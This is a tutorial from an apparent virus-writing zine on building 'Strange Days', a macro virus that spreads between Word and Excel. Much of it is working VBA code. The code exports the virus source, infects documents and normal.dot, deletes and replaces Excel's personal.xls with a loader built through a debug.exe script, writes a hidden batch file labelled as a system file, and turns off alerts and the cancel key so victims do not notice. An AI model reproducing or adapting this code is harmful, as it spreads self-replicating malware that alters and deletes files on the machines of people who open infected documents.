<hr>
<P> <b>Intro </b></P>
<P> When I started working on Office Cross Infections I had no idea how to jump 
  from Word to Excel and vice versa. So I first began to research a bit on the 
  OLE2 format but realized that it's very complex :P and can't be done in VBA 
  (Visual Basic for Applications - all office'97 programs are using this). Then 
  I tried to manage it with OLE Automation, but anyways this didn't work coz you 
  have to import sum libs manually. After more researching I found sum info on 
  DDE (Dynamic Data-Exchange). With DDE you can send data from one application 
  to an other. I managed it to import code from word into excel using DDE and 
  the SendKeys command. But this was way too suspicious becoz the user could see 
  it very well. (VicodinES, Alt-F11 and me are sharing macro ideas/code since 
  the beginning of the word/excel infecting idea... so all the cross infectors 
  known till now could be seen as the success of our teamwork. Now Alt-F11 finally 
  managed to write a less suspicious DDE macro virus by using DDE entries, gewd 
  work man! ;) </P>
<P>
 Becoz of time pressure (mgl also wanted to be first :) I was switching from
 the DDE stuff to an idea I had while lying stoned to death in my bed after
 reading about the kewl import/export method - thanx again vic! The virus
 exports it's source to the harddisk and then dr0ps a global template
 (normal.dot for word and personal.xls for excel) that works as loader and
 imports the virus source again in the other application.
</P>
<P> <b>DDE vs. Strange Days method </b></P>
<P>
 To build your own opinion I'd recommend to first take a l00k at the strange
 days source (dr0pping a global template) and the shiver source (DDE) which
 are included in this issue.
</P>
<P> Well, the main disadvantage of the strange days way is that the virus becomes 
  extremely huge. The problem that it needs debug.exe to spread isn't a real problem 
  at all coz everyone (even NT users) got it anyways. </P>
<P> On the other side the sucking thingy on DDE is that you have to start the 
  other application before opening a channel and then you need to use the SendKeys 
  command to force word to import the virus. At this moment word popps up of it's 
  minimized state for a short moment and is noticeable/suspicious. </P>
<P>
 Anyways don't forget to read more about DDE in the part II of the cross
 infection tuto (DDE could also be interesting for other viruses)!
</P>
<P> <b>Basic Concept </b></P>
<P>
 Here I'll try to give an overview how an infected doc file gets processed
 and jumps to excel (excel to word works the same way - just vice versa)
</P>

  <PRE>
 Word:			   *     c:\     *	   Excel:
			           *             *
                               * .---------. *
             1.) export virus  * | Lo.sys: | 4.) The next time excel is

<P><b> Detailed Information </b></P>
<P>
 In this section the theory will get practised and the important stuff is
 explained step by step (word to excel only coz excel to word is the same
 thing again, just vice versa).
</P><P>
 First you have to export the virus source code, so the loader will be l8r
 able to import it to excel.
</P>
<PRE>
   Application.VBE.ActiveVBProject.VBComponents("StrangeDays").Export "c:\lo.sys"
</PRE>
<P>
 Ok, now you have to check if you are in word or excel. This can simply
 be done this way coz in excel there will never be an active document.
</P><PRE>
   If ActiveDocument = "" Then GoTo teonanacatl
</PRE><P>
 Then check if normal.dot and the active document are infected.
</P>
<PRE>
   For i = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents(i).Name = "StrangeDays" Then r = True
   Next i
   For i = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents(i).Name = "StrangeDays" Then e = True
   Next i
</PRE>
<P>
 If they're still clean you should infect them by using the standard import/
 export infection technique to avoid the sr-2 protection.
</P>
<PRE>
   If e = False Then
   With ActiveDocument.VBProject
   With .VBComponents.Import("c:\lo.sys")
   End With
   End With
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
   End If
   If r = False Then
   With NormalTemplate.VBProject
   With .VBComponents.Import("c:\lo.sys")
   End With
   End With
   End If
</PRE>
<P>
 Now you have to check if excel already is infected. This can be done in
 various ways, for example marking it in a file (like here) or in the
 registry.
</P><PRE>
   a = GetPrivateProfileStringA("29A", "Magic", "", b, 255, "c:\lo.idx")
   If b = "666" Then GoTo godsucks
</PRE><P>
 After you're sure that excel is not infected yet, you must use api calls
 to access the registry and get the full path of excel.
</P><PRE>
   u = RegQueryValueExA(k, "Path", 0, REG_SZ, ByVal v$, s)
   u = RegCloseKey(k)
   For e = 1 To Len(v$)
   If Mid$(v$, e, 1) = Chr$(0) Then GoTo lizard
   h$ = h$ + Mid$(v$, e, 1)
   Next e
   lizard:
</PRE><P>
 Ok, now you got the path of the original personal.xls which you have to
 delete and replace it with the corrupted one that imports the virus source.
</P><PRE>
   p = h$ + "\xlstart\personal.xls"
   DeleteFileA (p)
   Open "c:\a.scr" For Output As 1
   Print #1, "N PERSONAL.XLS"
   Print #1, "E 0100 D0 CF 11 E0 A1 B1 1A E1 00 00 00 00 00 00 00 00"
   Print #1, "E 0110 00 00 00 00 00 00 00 [...]
   Close 1
</PRE><P>
 This is how the code of the personal.xls-loader looks:
</P><PRE>
 ===========================================================================
 Module name: syaDegnartS (Macro)
 ---------------------------------------------------------------------------
 Attribute VB_Name = "syaDegnartS"
 Sub Auto_Close()
 On Error GoTo argh
 Application.DisplayAlerts = False
 Application.EnableCancelKey = xlDisabled

 For i = 1 To Workbooks("personal.xls").VBProject.VBComponents.Count
 If Workbooks("personal.xls").VBProject.VBComponents(i).Name = "StrangeDays"
  Then GoTo argh
 Next i

 With Workbooks("personal.xls").VBProject
 With .VBComponents.Import("c:\lo.sys")
 End With
 End With

 Workbooks("personal.xls").Save
 argh:
 End Sub
 ===========================================================================
</PRE><P>
 The code of the normal.dot-loader l00ks a bit diffrent but does the same:
</P>
<PRE>
 ===========================================================================
 Module name: syaDegnartS (Macro)
 ---------------------------------------------------------------------------
 Attribute VB_Name = "syaDegnartS"
 Sub AutoExec()
 On Error GoTo argh
 Application.DisplayAlerts = False
 Application.EnableCancelKey = wdDisabled

 For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 If NormalTemplate.VBProject.VBComponents(i).Name = "StrangeDays" Then GoTo argh
 Next i

 With NormalTemplate.VBProject
 With .VBComponents.Import("c:\lo.sys")
 End With
 End With

 NormalTemplate.Save
 argh:
 End Sub
 ===========================================================================
</PRE>
<P>
 Then you have to build a batch file that converts the debug script of
 normal.dot and copies it to the word template path and deletes all the
 other files, that you don't need anymore.
</P><PRE>
   Open "c:\start.bat" For Output As 1
   Print #1, "REM This is a system file. Do not edit or remove!"
   Print #1, "@echo off"
   Print #1, "c:"
   Print #1, "cd\"
   Print #1, "dir"
   Print #1, "debug < a.scr > nul"
   Print #1, "copy personal.xls " + p
   Print #1, "del a.scr"
   Print #1, "del personal.xls"
   Close 1
   Shell "c:\start.bat", vbHide
</PRE><P>
 To finish the whole process mark excel as infected.
</P><PRE>
   c = WritePrivateProfileStringA("29A", "Magic", "666", "c:\lo.idx")
</PRE>
<P> <b>Diffrent AutoMacros </b></P>
<P>
 In word and excel the automacros are diffrent so don't forget to add an
 excel automacro that references to the word automacro else it won't be
 run.
</P>
<P> For example this macro (and with it the virus code) is executed automatically 
  by word every time a file gets closed. </P>
<PRE>
   Sub AutoClose()
   (virus code)
   End Sub
</PRE><P>
 While this macro is launched by excel every time a file gets opened. It then
 just calls the macro above (containing the virus code).
</P><PRE>
   Sub Auto_Open()
   Application.OnSheetActivate = "StrangeDays.AutoClose"
   End Sub
</PRE>
